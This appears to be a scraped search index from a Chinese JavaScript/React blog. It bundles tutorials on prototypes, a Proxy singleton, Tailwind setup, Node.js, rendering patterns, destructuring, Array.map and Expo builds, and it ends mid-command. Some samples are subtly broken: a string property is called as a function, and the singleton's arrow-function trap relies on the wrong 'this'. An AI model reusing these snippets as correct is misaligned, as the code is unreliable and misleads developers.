可以从父 class 继承 不从 class 继承（因为 JS 没有 class 的概念，即使是 ES6 的 class，它的底层也是基于 prototype，所以它只是一个类似经典 class 的语法糖）   class 是不可变的，它不能在运行时更改 原型prototype可以在运行时更改   类支持或不支持多重继承（取决于语言） 对象可以从多个原型继承    原型继承   原型继承的定义特征是对象实例可以通过原型链访问继承的属性和方法。\n  这是通过 JavaScript 中的每个对象自动赋予一个原型属性prototype来实现的。\n  当创建继承自父对象的子对象时，子对象可以访问父对象的原型属性prototype。\n  proptotype 属性本身是一个对象，并且因为子对象可以访问其父对象的原型属性，因此子对象可以访问存储在此处(prototype)的任何属性和方法。\n  案例，假设有一个 vehicle（车辆） 对象，在许多其他语言中，Vehicle会被认为是一个class，因为它是创建vehicle（车辆）类型实例的蓝图。\n然而 JavaScript 并没有 class 的概念，取而代之的是一个构造函数（对象），用作创建其他对象的蓝图。\n- - - step1. 构建一个“类” 1 2 3 4 5 6 7 8 9 10  // 使用构造器（构造函数）构建一个`Vehicle（车辆）`类 let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; this.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); //鸣喇叭  }; };   - - - step2. 实列化一个对象 1 2 3 4  let myVehicle = new Vehicle(\u0026#39;blue\u0026#39;, \u0026#39;500\u0026#39;, 2019);\tmyVehicle.color(); // \u0026#39;blue\u0026#39; myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   - - - step3. 原型 prototype 登场 - 优化 在上例中，因为已经在构造函数体中定义了 honk 方法，\n所以每个新的车辆实例都会有它自己单独的 honk 副本存储在内存中。\n由于 honk 始终是相同的功能，因此每个实例存储自己的唯一副本是没有意义的。\n这就是原型的力量发挥作用的地方。（对象可以访问其父对象的原型属性，因此将 honk 方法存储在 Vehicle 的原型属性中，则所有实例都可以访问它，而无需存储自己的副本。）\n1 2 3 4 5 6 7 8 9 10 11 12 13 14  let Vehicle = function (color, weight, year) { this.color = color; this.weight = weight; this.year = year; }; Vehicle.prototype.honk = function () { console.log(\u0026#34;Honk!\u0026#34;); }; let myVehicle = new Vehicle(\u0026#34;blue\u0026#34;, \u0026#34;500\u0026#34;, 2019); myVehicle.honk(); // \u0026#39;Honk!\u0026#39;   三、原型链 __proto__ （链接） 本质上，当调用 honk 方法时，JavaScript 将查看调用对象的属性，在本例中为 myVehicle，用于名为 honk 的方法（或属性）。 如果在对象上找不到此属性，我们将向上移动一级原型链。\n为了建立对象与其原型之间的链接，使用了 myVehicle 的 proto 属性。 这个 proto 属性本质上是指向它的构造函数原型的链接。\n一般而言，实例的 __proto__ 属性是指向它的原型（其构造函数的原型属性）的链接。\n在控制台中演示：\n1 2  myVehicle.__proto__ === Vehicle.prototype // true   因为在原型上显式地存储了 honk 方法，所以，Vehicle 的所有实例都可以访问 honk 方法，而无需存储自己的副本。\n四、子类继承（用原型链模拟）   fn.call()：call方法的作用是调用fn构造函数\n  Object.create()：允许创建一个新对象，同时指定该对象的原型\n  假设我们有一个不同的构造函数，它类似于 Vehicle（车辆） 但更具体，例如 Motorcycle（摩托车） 构造函数。\nMotorcycle（摩托车） 具有与 Vehicle（车辆） 相同的所有属性和功能，但它还具有 engineSize（引擎尺寸） 属性和加油方法。\n因为摩托车与车辆共享相同的属性，所以可以使用继承来简化代码。 通过让 Motorcycle 从 Vehicle 继承，可以避免两次指定共享的属性和方法。\n 注意：类和子类是经典继承的一个特征，而不是原型继承，这意味着Motorcycle实际上不是一个子类。 在 JavaScript 中，使用原型链来模拟类和子类。  1 2 3 4 5 6 7 8 9  let Motorcycle = function (color, weight, year, engineSize) { Vehicle.call(this, color, weight, year); //call方法的作用是调用Vehicle构造函数  this.engineSize = engineSize; }; Motorcycle.prototype = Object.create(Vehicle.prototype) //Object.create方法允许创建一个新对象，同时指定该对象的原型  let myMotorcycle = new Motorcycle(\u0026#34;green\u0026#34;, 150, 2015, 500);   通过这一步，已经连接了原型链。\nMotorcycle.prototype 的 proto 属性将设置为 Vehicle.prototype，摩托车实例现在可以访问摩托车原型以及车辆原型上存储的所有属性和方法。\n为了演示这一点，在 Motorcycles 原型中添加加油方法:\n1 2 3 4 5 6 7  Motorcycle.prototype.refuel = function () { console.log(\u0026#34;Your fuel tank is now full!\u0026#34;); }; myMotorcycle.honk(); // \u0026#39;Honk!\u0026#39; myMotorcycle.refuel(); // \u0026#39;Your fuel tank is now full!\u0026#39;   五、结语 JavaScript 实现面向对象编程的方式与许多其他使用基于class类的语言不同。\n通过掌握原型继承、构造函数和原型链，才可以充分利用语言特性并了解 JavaScript 在底层是如何工作的。\n","description":"JavaScript 的继承和原型链概念","id":30,"section":"javascript","tags":null,"title":"原型链和继承","uri":"https://codthing.github.io/javascript/prototype/prototype-bp/"},{"content":"单例是一种面向对象的软件设计模式，它确保给定的类只被实例化一次。\n比如，数据库连接。\nProxy Proxy 对象用于创建一个对象的代理，从而实现基本操作的拦截和自定义（如属性查找、赋值、枚举、函数调用等）。\n#. 语法 1 2  new Proxy(target, handler)   #. 术语  handler 包含捕捉器（trap）的占位符对象（处理器对象）。 traps 允许为某些操作（例如属性查找、赋值等）定义自定义行为的方法。这类似于操作系统中捕获器的概念。 target 被 Proxy 代理虚拟化的对象。它常被作为代理的存储后端。根据目标验证关于对象不可扩展性或不可配置属性的不变量（保持不变的语义）。  #. Proxy 有2个参数  target 被代理的对象。它可以是任何类型的对象，包括内置的数组，函数甚至是另一个代理对象。 handler 被代理对象上的自定义行为。它是一个对象，它的属性提供了部分操作时所发生的处理函数。  使用 Proxy 构建单例模式  单例模式规定给定的类只能有一个实例。 这意味着最有用的捕获器（注意：proxy中有多种捕获器）是 handler.construct()。 handler.construct() 方法用于拦截 new 操作符. 为了使new操作符在生成的Proxy对象上生效，用于初始化代理的目标对象自身必须具有[[Construct]]内部方法（即 new target 必须是有效的）。  1 2 3 4 5 6 7 8 9 10 11  const singletonify = (className) =\u0026gt; { return new Proxy(className.prototype.constructor, { instance: null, construct: (target, argumentsList) =\u0026gt; { if (!this.instance) this.instance = new target(...argumentsList); return this.instance; } }); }   使用示例 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17  class MyClass { constructor(msg) { this.msg = msg; } printMsg() { console.log(this.msg); } } MySingletonClass = singletonify(MyClass); const myObj = new MySingletonClass(\u0026#39;first\u0026#39;); myObj.printMsg(); // \u0026#39;first\u0026#39; const myObj2 = new MySingletonClass(\u0026#39;second\u0026#39;); myObj2.printMsg(); // \u0026#39;first\u0026#39;   可以看到 第二次 MySingletonClass 被实例化了，但什么都没有发生。\n这是因为一个实例已经存在，所以它被 返回 而不是创建一个新对象。\n","description":"单例是一种面向对象的软件设计模式，它确保给定的类只被实例化一次","id":31,"section":"javascript","tags":null,"title":"在 JavaScript 中实现单例","uri":"https://codthing.github.io/javascript/function/single/"},{"content":"一、收集需求 第一步也是最重要的一步是收集所有需求。\n我们生活在一个非常复杂的世界中，不同背景的人可以帮助我们填补空白（自己的局限性）。\n因此，应该与可能对其感兴趣的所有人群（利益相关者）讨论该任务。\n需要对期望的结果有最清楚的理解，需要把它写下来：这有助于发现所有的需求和影响。\n举例：\n1. 产品团队：他们知道功能和目标。它们帮助我们了解该功能的快乐路径和商业价值。\r2. 技术团队：他们是系统专家，可以指出陷阱和可能的并发症。他们的经验对于创建估计和定义未知数也很重要。\r3. 设计团队：如果该功能涉及 UI 或 UX 的更改，请务必与团队讨论设计以发现任何可能的问题。\r4. QA团队：质量保证团队是最接近最终用户的团队。他们接受过产品使用培训，擅长尝试各种不愉快的道路。我们可以利用他们的经验来创建一组测试用例来推动开发。\r5. 移动工程师和后端工程师可以在不同的团队中工作并经常协作。如果一个功能需要一个新的端点，那么让后端团队参与是很重要的。他们需要计划和安排一些时间与您的团队合作，他们可以帮助设计一个可以很好扩展的数据流。\r6. 法律/合规和安全团队：当一项功能需要收集一些新数据时，我们必须让法律、合规和安全团队参与，以确保该功能可以开发，服务条款是否必须更新以及如何处理。 经常与这些团队沟通，召开会议并公开讨论该功能。记下讨论的内容并与团队分享。在进入下一步之前获得他们的支持。\n二、原型制作 在这一步中，一两个人会投入一些时间来探索该技术，并将团队想要开发的内容的概念证明 (POC) 放在一起。\n这里的目标是快速响应：没有​​测试，没有干净的代码，没有错误处理。我们只需要检查是否可行以及可能存在哪些问题。\n原型设计应该有时间限制：时间应该投入最少的时间来回答最有说服力的问题。\n一旦团队有了一些可行的方法，请与利益相关者核对以验证团队是否朝着正确的方向前进。\n然后，我们必须避免一个常见的陷阱：将原型推向生产。原型的开发没有考虑到可扩展性和工程最佳实践。将其推广到生产可能会带来短期收益，但从长远来看，它会产生技术债务和更高的成本。\n三、设计 一旦需求明确并且原型被接受，就是使用UML图表和适当的文档设计适当的解决方案的时候了。\n它允许我们快速绘制类图和序列图，以了解如何组成系统以及它应该如何运行。可以使用绘制 UML 图的工具 - diagrams.net（以前称为 draw.io）\n设计解决方案时无需深入细节。高级设计，组件之间的连接就足够了。当所有团队在设计上进行协作并就实施达成一致时，才能获得最佳结果。\n采用迭代方法很重要。在设计解决方案的特定部分时，利益相关者应该参与进来：他们可以仔细检查他们的要求是否得到尊重。例如，如果安全团队不相信敏感信息的存储方式，团队可以迭代解决方案的那部分，直到每个人都满意。\n此步骤的结果是一份包含解决方案架构的文档，有助于定义评估。它还跟踪时间线上做出的决定。\n四、测试驱动的实现（TDD 区别于 CDD） 在这个阶段，设计被分成更小的任务，分配给不同的团队成员。行业标准是使用测试驱动开发(TDD) 方法实现功能。\nTDD 有几个可以加快整体开发周期的好处：\n1. 处理测试用例（由 QA 团队定义）以确保该功能符合所有要求。 2. 不会添加超过需要的内容（YAGNI原则）。\r3. 编写的代码本质上是可测试的。否则，无法先编写测试。\r4. 不会浪费时间手动测试代码。在移动开发中，手动测试意味着：构建应用程序、启动模拟器、加载应用程序、启动它、导航到正确的屏幕并测试它。此过程可能需要几分钟时间。单元测试需要几毫秒。\r5. 获取一个测试套件，以防止代码回归。\r6. 获取测试代码的文档。 五、验收和发布 至此，该功能已经开发完成。\n我们需要将其提交给质量保证部门以及产品和设计团队，以查看它是否通过了人工验收标准。\n质量保证团队希望测试最关键的路径和新功能的行为。\n同样，设计和产品团队希望仔细检查用户体验和需求是否符合他们的想法。\n届时，该功能已准备好发布给最终用户。\n六、结语 个人项目也可以遵循此过程。我们应该始终检查功能的预期内容，验证假设，设计适当的解决方案。\n这个过程可以节省大量时间，也可以最大限度地提高人们的幸福感：当他们参与到项目中时，他们会感到被倾听，并且很重要。\n轻松协作，才能为项目的成功生根发芽。而这也是我们所渴望的。\n","description":"开发任何功能的5个步骤","id":32,"section":"others","tags":null,"title":"如何开发功能和解决问题","uri":"https://codthing.github.io/others/devmethod/devmethod/"},{"content":"VSCode 插件   PostCSS Language Support\n  Tailwind CSS IntelliSense\n  Next.js + TailwindCSS 在 Next.js v10+ 项目中设置 Tailwind CSS\nStep1. 创建项目 1 2  yarn create next-app --typescript   Step2. 安装Tailwind CSS tailwindcss 通过 yarn 安装及其对等依赖项，然后运行 ​​init 命令生成 tailwind.config.js 和 postcss.config.js.\n1 2 3 4  yarn add --dev tailwindcss postcss autoprefixer npx tailwindcss init -p   Step3. 配置模板路径 在文件中添加所有模板文件的路径 tailwind.config.js。\n1 2 3 4 5 6 7 8 9 10 11  module.exports = { content: [ \u0026#34;./pages/**/*.{js,ts,jsx,tsx}\u0026#34;, \u0026#34;./components/**/*.{js,ts,jsx,tsx}\u0026#34;, ], theme: { extend: {}, }, plugins: [], }   Step4. 将 Tailwind 指令添加到 CSS 将 @tailwindTailwind 的每个层的指令添加到文件中。 ./styles/globals.css\n1 2 3 4  @tailwind base; @tailwind components; @tailwind utilities;   Step5. 开始构建过程 1 2  yarn dev   Step6. 开始在项目中使用 Tailwind 开始使用 Tailwind 的实用程序类来设计内容。\n1 2 3 4 5 6 7 8  export default function Home() { return ( \u0026lt;h1 className=\u0026#34;text-3xl font-bold underline\u0026#34;\u0026gt; Hello world! \u0026lt;/h1\u0026gt; ) }   ","description":"","id":33,"section":"react","tags":null,"title":"安装","uri":"https://codthing.github.io/react/tailwindcss/tailwindcss-start.md/tailwindcss-install/"},{"content":"Node.js 简介 Node.js 是一个开源的跨平台 JavaScript 运行时环境。\nNode.js 在浏览器之外运行 V8 JavaScript 引擎，它是 Google Chrome 的核心。\nNode.js 应用程序在单个进程中运行，无需为每个请求创建一个新线程。Node.js 在其标准库中提供了一组异步 I/O 原语，以防止 JavaScript 代码阻塞，通常，Node.js 中的库是使用非阻塞范式编写的，使得阻塞行为成为例外而不是常态。\n构建 Node.js 应用程序（web服务器） Step1. 创建一个项目目录 1 2  mkdir node-webserver \u0026amp;\u0026amp; cd node-webserver   Step2. 编辑一个server服务器主文件 1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16  // app.js const http = require(\u0026#39;http\u0026#39;); const hostname = \u0026#39;127.0.0.1\u0026#39;; const port = 3000; const server = http.createServer((req, res) =\u0026gt; { res.statusCode = 200; res.setHeader(\u0026#39;Content-Type\u0026#39;, \u0026#39;text/plain\u0026#39;); res.end(\u0026#39;Hello World\u0026#39;); }); server.listen(port, hostname, () =\u0026gt; { console.log(`Server running at http://${hostname}:${port}/`); });    导入 Node.js http模块 http 的 createServer() 方法创建一个新的 HTTP 服务器 每当接收到新请求时，都会调用 request事件，提供两个对象：请求 和 响应 服务器设置为侦听指定的端口和主机名。当服务器准备好时，回调函数被调用，通知我们服务器正在运行 将 statusCode 属性 设置为 200，以指示成功响应 设置 Content-Type 标头 关闭 响应，将内容作为参数添加到 end()  Step3. 启动服务器 1 2  node app.js   Node.js 框架和工具 Socket.io 双向和低延迟通信\nAdonisJS 基于 TypeScript 的全功能框架\n（我个人觉得很棒，单看文档结构就知道如何实施服务端了，非常直观。虽然关注度不是很高，但是好用才是真理）\nLoopback.io 一个高度可扩展的 Node.js 和 TypeScript 框架用于构建 API 和微服务。\nStrapi 灵活的开源 Headless CMS，它让开发人员可以自由选择他们喜欢的工具和框架，同时还允许编辑人员轻松管理和分发他们的内容。\n通过插件系统使管理面板和 API 可扩展，Strapi 使世界上最大的公司能够在构建精美的数字体验的同时加速内容交付。\nNext.js React框架，提供生产所需的所有功能的最佳开发人员体验：混合静态和服务器渲染、TypeScript 支持、智能捆绑、路由预取等。\nqiankun 微前端的快速、简单和完整的解决方案。\nsingle-spa 用于轻松微前端的路由器。是qiankun的鼻祖\n","description":"快速开始","id":34,"section":"nodejs","tags":null,"title":"快速开始","uri":"https://codthing.github.io/nodejs/nodebase/node-start/"},{"content":"介绍 如今，可以通过多种方式在 Web 上呈现内容。\n如何以及在何处获取和呈现内容的决定是应用程序性能的关键。\n可用的框架和库可用于实现不同的渲染模式，如客户端渲染、静态渲染、水化、渐进式渲染和服务器端渲染。\n在我们决定哪种模式最适合我们的应用程序之前，了解每种模式的含义很重要。\nChrome 团队鼓励开发人员考虑静态渲染或服务器端渲染，而不是完全重新水化的方法。\n随着时间的推移，默认情况下的渐进式加载和渲染技术可能有助于在使用现代框架时在性能和功能交付之间取得良好的平衡\n以下部分将提供有关衡量应用程序在 Web 渲染方面的性能要求的指南，并建议最能满足这些要求的模式。\n随后，我们将深入探讨每种模式并了解如何实施。\n我们还将讨论可用于实现这些模式的 Next.js。\n然而，在我们进入可用的模式或 Next.js 之前，让我们先看看我们是如何到达这里的，以及导致 React 框架和 Next.js 创建的驱动因素是什么。\n\rWeb 渲染简史 Web 技术一直在不断发展以支持不断变化的应用程序需求。\n所有网站的构建块 HTML、CSS 和 JavaScript 也随着时间的推移而发展，以支持不断变化的需求并利用浏览器的进步。\n在 2000 年代初期，我们有一些网站，其中 HTML 内容完全由服务器呈现。\n开发人员依靠服务器端脚本语言（如 PHP 和 ASP）来呈现 HTML。\n所有关键导航都需要重新加载页面，并且客户端最多使用 JavaScript 来隐藏/显示或启用/禁用 HTML 元素。\n2006 年，Ajax 引入了单页应用程序 (SPA) 的可能性，Gmail 是最流行的例子。 Ajax 允许开发人员在不加载新页面的情况下向服务器发出动态请求。\n因此，可以将 SPA 构建为类似于桌面应用程序。\n很快，开发人员开始使用 JavaScript 来获取和呈现数据。创建了可用于在 MVC 框架中构建视图层功能的 JavaScript 库和框架。 JQuery、Backbone.js 和 AngularJS 等客户端框架使开发人员可以更轻松地使用 JavaScript 构建核心功能。\nReact 于 2013 年推出，作为构建用户界面和 UI 组件的灵活框架，并为开发单页 Web 和移动应用程序提供了基础。\n从 2015 年到 2020 年，React 生态系统已经发展到包括支持数据流架构库（Redux）、CSS 框架（React-Bootstrap）、路由库和移动应用程序框架（React Native）。\n但是，纯客户端渲染框架存在一些缺点。因此，开发人员开始探索新的方法来充分利用客户端和服务器端渲染世界。\n渲染 - 关键性能指标 在讨论缺点之前，让我们了解如何衡量渲染机制的性能。\n对以下术语的基本理解将有助于我们比较此处讨论的不同模式。\n   关键词 描述     TTFB Time to First Byte - 单击链接和第一个内容进入之间的时间   FP First Paint - 第一次绘制 - 用户第一次看到任何内容或在屏幕上绘制前几个像素的时间   FCP First Contentful Paint - 所有请求的内容变为可见的时间   LCP Largest Contentful Paint - 最大的内容绘制 - 主页内容变得可见的时间。 这是指在视口内可见的最大图像或文本块   TTI 可交互时间 - 页面变为可交互的时间，例如，事件已连接等   TBT 总阻塞时间 - FCP 和 TTI 之间的总时间量    关于这些性能参数的一些重要说明如下。\n  大型 JavaScript 包可能会增加页面到达 FCP 和 LCP 所需的时间。 用户将需要等待一段时间才能从大部分空白页面转到加载了内容的页面。\n  较大的 JavaScript 包也会影响 TTI 和 TBT，因为只有在加载了最少的 JavaScript 并连接了事件后，页面才能变得可交互。\n  内容的第一个字节到达浏览器 (TTFB) 所需的时间取决于服务器处理请求所用的时间。\n  preload、prefetch 和 script 属性等技术会影响上述参数，因为不同的浏览器对它们的解释不同。 在使用这些属性之前，了解浏览器为这些属性分配的加载和执行优先级会很有帮助。\n  我们现在可以使用这些参数来了解每种模式在渲染要求方面必须提供什么。\n\r模式 - 快速浏览 客户端渲染 (CSR) 和服务器端渲染 (SSR) 形成了可用于渲染的选择范围的两个极端。\n下图中列出的其他模式使用不同的方法来提供从 CSR 和 SSR 借用的某些功能组合。\n杰森·米勒插图\n我们将详细探讨这些模式中的每一个。\n然而，在此之前，让我们谈谈 Next.js，它是一个基于 React 的框架。\nNext.js 与我们的讨论相关，因为它可用于实现以下所有模式。\n SSR Static SSR (实验标志) SSR with Rehydration 带补水的 SSR CSR with Prerendering also known as Automatic Static Optimization 带有预渲染的 CSR 也称为自动静态优化 Full CSR  \r结论 我们现在已经介绍了四种本质上是 SSR 变体的模式。\n这些变化使用技术组合来降低一个或多个性能参数，\n如 TTFB（静态和增量静态生成）、TTI（渐进式水化）和 FCP/FP（流媒体）。\n这些模式建立在现有的客户端框架（如 React）之上，并允许进行某种补充以实现 CSR 的交互级别。\n因此，我们有多种选择来实现结合 SSR 和 CSR 利益的最大化。\n\r概括 根据应用程序的类型或页面类型，某些模式可能比其他模式更合适。\n下图重新审视、总结和比较了我们在前几节中讨论的每个模式的亮点，并为每个模式提供了用例。\n\r知识点  TTFB FP FCP LCP TTI TBT ajax next.js SSR Static SSR SSR with hydration CSR Full CSR  ","description":"如何以及在何处获取和呈现内容的决定是应用程序性能的关键","id":35,"section":"react-patterns","tags":null,"title":"渲染模式介绍","uri":"https://codthing.github.io/react-patterns/render-patterns/render-patterns-base/"},{"content":"1. 忽略值 1 2 3  const [apple, , banana] = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; console.log(apple, banana); // apple banana   2. 分配剩余值 1 2 3 4 5 6  const [one, two, ...remainingNum] = [1, 2, 3, 4, 5]; console.log(remainingNum); // [3, 4, 5]  const { apple, pear, ...remainFruits } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }; console.log(remainFruits); // { banana:\u0026#39;banana\u0026#39;, cherry:\u0026#39;cherry\u0026#39; }   3. 组合的数组和对象 - 解构 1 2 3  const [, , { name }] = [{id:1, name:\u0026#39;apple\u0026#39;}, {id:2, name:\u0026#39;pear\u0026#39;}, {id:3, name:\u0026#39;banana\u0026#39;}]; console.log(name); // banana   4. 交换数组中的变量 1 2 3  const fruits = [\u0026#39;apple\u0026#39;, \u0026#39;pear\u0026#39;, \u0026#39;banana\u0026#39;]; [fruits[2], fruits[1]] = [fruits[1], fruits[2]];   5. 重命名变量 1 2 3  const { apple, pear, bUNana: banana } = { apple:\u0026#39;apple\u0026#39;, pear:\u0026#39;pear\u0026#39;, bUNana:\u0026#39;banana\u0026#39; }; console.log(banana); // banana   6. 设置默认值 1 2 3 4 5 6  const { banana = \u0026#39;banana\u0026#39;, apple } = { banana:undefined, apple:\u0026#39;apple\u0026#39; }; console.log(banana); // banana  const [one, two, three = 3] = [1, 2, undefined]; console.log(three); // 3   7. 嵌套结构 1 2 3 4 5 6  const { banana, fruitList: [{ apple: nestedApple }] } = { banana: \u0026#39;banana\u0026#39;, fruitList: [{ apple: \u0026#39;apple\u0026#39; }, { pear: \u0026#39;pear\u0026#39; }] }; console.log(nestedApple); // apple   8. 动态对象键 1 2 3 4 5  const fruits = {banana:\u0026#39;banana\u0026#39;, cherry: \u0026#39;cherry\u0026#39;}; const fruitKey = \u0026#39;banana\u0026#39;; const {[fruitKey]:fruitOfChoice} = fruits; console.log(fruitOfChoice); // banana   9. 解构函数参数 1 2 3 4  const getCherry = ({banana, cherry}) =\u0026gt; console.log(cherry); const fruits = {banana: \u0026#39;banana\u0026#39;, cherry: \u0026#39;cherry\u0026#39;}; getCherry(fruits); // cherry   ","description":"强大的JavaScript解构技术","id":36,"section":"javascript","tags":null,"title":"解构赋值","uri":"https://codthing.github.io/javascript/array/jiegou/"},{"content":"注意：菜单项目中（X）的都为过时或者不建议使用的模式，依然写出来只是为了让我们了解历史\n设计模式是软件开发的基本部分，\n因为它们为软件设计中经常出现的问题提供了典型的解决方案。\n设计模式不是提供特定的软件部分，而是可以用来以优化的方式处理重复出现的主题的概念。\n在过去的几年里，Web 开发生态系统发生了迅速的变化。\n虽然一些众所周知的设计模式可能根本不像过去那样有价值，但其他设计模式已经演变为使用最新技术解决现代问题。\nFacebook 的 JavaScript 库 React 在过去 5 年中获得了巨大的吸引力，与Angular、Vue、Ember和Svelte等竞争性 JavaScript 库相比，它是目前NPM 上下载频率最高的框架。\n由于 React 的流行，设计模式已被修改、优化并创建了新的模式，以便在当前的现代 Web 开发生态系统中提供价值。\n最新版本的 React 引入了一个名为Hooks的新功能，它在您的应用程序设计中扮演着非常重要的角色，可以替代许多传统的设计模式。\n现代 Web 开发涉及许多不同类型的模式。\n使用 ES2015+ 的常见设计模式的实现、优点和陷阱、特定于 React 的设计模式及其使用 React Hooks 的可能修改和实现，以及更多有助于改进现代 Web 应用程序的模式和优化！\n","description":"设计模式是软件开发的基本部分，因为它们为软件设计中经常出现的问题提供了典型的解决方案。设计模式不是提供特定的软件部分，而是可以用来以优化的方式处理重复出现的主题的概念。","id":37,"section":"react-patterns","tags":null,"title":"设计模式介绍","uri":"https://codthing.github.io/react-patterns/design-patterns/design-patterns/"},{"content":"map() 方法创建一个新数组，其中填充了对调用数组中的每个元素调用提供的函数的结果。\n使用 map 方法从数组中提取数据 目前为止，已经使用纯函数来避免程序中的副作用。 此外，已经看到函数的值仅取决于其输入参数。\n这仅仅是个开始。 顾名思义，函数式编程以函数理论为中心。\n能够将它们作为参数传递给其他函数，从另一个函数返回一个函数是有意义的。\n函数在 JavaScript 中被视为 First Class Objects，它们可以像任何其他对象一样使用。 它们可以保存在变量中，存储在对象中，也可以作为函数参数传递。\n从一些简单的数组函数开始，这些函数是数组对象原型上的方法。\n数组的 map 方法（即 Array.prototype.map()）。\n请记住，map方法是迭代数组中每一项的方式之一。 在对每个元素应用回调函数后，它会创建一个新数组(不改变原来的数组)。 它这样做时没有改变原始数组。\n当调用回调函数时，传入了三个参数。 第一个参数是当前正在处理的数组项。 第二个参数是当前数组项的索引值，第三个参数是在其上调用 map 方法的数组。\n简单的例子：\n1 2 3 4 5 6 7 8 9  const users = [ { name: \u0026#39;John\u0026#39;, age: 34 }, { name: \u0026#39;Amy\u0026#39;, age: 20 }, { name: \u0026#39;camperCat\u0026#39;, age: 10 } ]; const names = users.map(user =\u0026gt; user.name); console.log(names); // [ \u0026#39;John\u0026#39;, \u0026#39;Amy\u0026#39;, \u0026#39;camperCat\u0026#39; ]   复杂的例子：\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18  // 全局变量 const watchList = [ { \u0026#34;Title\u0026#34;: \u0026#34;Inception\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2010\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.8\u0026#34;, }, { \u0026#34;Title\u0026#34;: \u0026#34;Interstellar\u0026#34;, \u0026#34;Year\u0026#34;: \u0026#34;2014\u0026#34;, \u0026#34;imdbRating\u0026#34;: \u0026#34;8.6\u0026#34;, } ]; const ratings = watchList.map(({ Title: title, imdbRating: rating }) =\u0026gt; ({title, rating})); console.log(JSON.stringify(ratings)); // [{\u0026#34;title\u0026#34;:\u0026#34;Inception\u0026#34;,\u0026#34;rating\u0026#34;:\u0026#34;8.8\u0026#34;},{\u0026#34;title\u0026#34;:\u0026#34;Interstellar\u0026#34;,\u0026#34;rating\u0026#34;:\u0026#34;8.6\u0026#34;}]   \r在原型上实现 map 方法 Array.prototype.map() 方法（即 map()），通过 map 返回一个与调用它的数组长度相同的数组。\n只要它的回调函数不改变原始数组，它就不会改变原始数组。\n换句话说，map 是一个纯函数，它的输出仅取决于输入的数组和作为参数传入的回调函数。 此外，它接收另一个函数作为它的参数。\n实现一个 map，加深对它的了解。 可以用 for 循环或者 Array.prototype.forEach() 方法。\n1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21  // 全局变量 const s = [23, 65, 98, 5]; Array.prototype.myMap = function (callback) { const newArray = []; for (let i = 0; i \u0026lt; this.length; i++) { newArray.push(callback(this[i])); } // 或者 this.forEach(a =\u0026gt; newArray.push(callback(a)));  return newArray; }; const new_s = s.myMap(function (item) { return item * 2; }); console.log(new_s); // [ 46, 130, 196, 10 ]   ","description":"map() 方法创建一个新数组，其中填充了对调用数组中的每个元素调用提供的函数的结果。","id":38,"section":"javascript","tags":null,"title":"Array.prototype.map()","uri":"https://codthing.github.io/javascript/algorithms-data/function-programming/map-programming/"},{"content":"一、创建项目 expo init MyProject 创建项目，选择托管工作流的TypeScript的空白模板，然后用 expo eject 退出到裸漏工作流。\n之所以选择这种方式创建项目，是因为灵活性很大，可以在托管和裸漏之间做开发（android\u0026amp;ios/android）。\n因为很多库是依赖裸漏工作流开发的且打包android apk的时候可以减少size，但是同时也可以使用Expo开发的库而节省了手动配置的时间。\n特别注意：在退出之前，必须先expo login登录，否则在构建的时候会报错；在app.json中将基础的配置配置好，比如屏幕方向设置为 ‘default’，背景色设置为 ‘#00000088’ 等。免去之后手动配置的步骤。\nandroid package name 的命名方式：https://developer.android.com/studio/build/application-id\n二、从托管managed工作流中退出到裸漏bare工作流  Step1. 退出\n expo eject  Step2. 在项目根目录执行下载密钥\n expo fetch:android:keystore  Step3.将命令行窗口中的密钥复制保存到 temporary_dev_files/build_apk_key 临时文件夹中,便于之后打包apk使用\n 三、查看项目环境信息  Expo/RN项目根目录下可执行以下命令\n react-native info  Expo项目根目录下也可执行\n expo diagnostics 四、项目根目录最好新建一个 temporary_dev_files 临时开发文件夹，便于管理许多开发阶段临时存放的文件 五、关于修改node_modules软件包的事宜 有时候安装的软件包不符合自己的要求或者存在bug，需要自己修改软件包源代码，进入到node_modules中找到相关的软件包源码进行修改。\n在不影响开发的情况下，最省事的做法是，将修改好的代码复制一份保存到 temporary_dev_files/modules (注意不要命名为node_modules，因为github不会提交) 临时文件夹，项目会自动读取modules的修改文件。\n六、.d.ts 文件 很多时候，很多库都没有直接安装的TypeScript版本，但是往往带有 index.d.ts 文件。\n可以将它放置到 no_modules/对应的软件包根目录中，就可以生效了，当然，也可在项目根目录新建一个d.ts文件夹，里面可以放置各种库的d.ts文件。\n也可以更省事在项目根目录新建type.d.ts\n或者\n或者（推荐）\n项目根目录新建 type.d.ts\ndeclare module \u0026#39;react-native-static-server\u0026#39;\rdeclare module \u0026#39;react-native-fs\u0026#39; 七、关于expo启动图片不显示和裸漏工作流打包失败的问题 expo sdk40 启动图片不显示，连官方都给不到答案。github issues\n同时，裸漏工作流打包失败。裸漏工作流和托管工作流打包出来的apk都不显示图像。\n问题分析，本地java sdk和托管服务器java sdk没有升级。\n解决办法：\n升级java8到最新版本就可以解决了。\n从8u271 升级到 8u281 。\n裸漏工作流中打包没有问题了，同时apk启动图像也可以显示了。\n至于托管工作流，由于服务器在Expo，要等到他们升级了估计才能正常显示图片。\n八、打包apk的尺寸和性能提升 用裸漏工作流打包要比托管工作流尺寸要小不少，这对于对体积有要求的项目是个选择。\n压缩及优化apk包 \u0026ndash;启用Hermes爱马仕 + 构建不同架构的apk\n图片会对性能有很大的影响（cpu和内存等峰值），建议使用webp格式的图像\n// Step1. android/app/build.gradle\rproject.ext.react = [\rentryFile: \u0026#34;index.js\u0026#34;,\r- enableHermes: false // clean and rebuild if changing\r+ enableHermes: true // clean and rebuild if changing\r]\r- def enableHermes = project.ext.react.get(\u0026#34;enableHermes\u0026#34;, false);\r+ def enableHermes = project.ext.react.get(\u0026#34;enableHermes\u0026#34;, true);\r- def enableSeparateBuildPerCPUArchitecture = false\r+ def enableSeparateBuildPerCPUArchitecture = true\r// Step2. 清理构建\rcd android \u0026amp;\u0026amp; 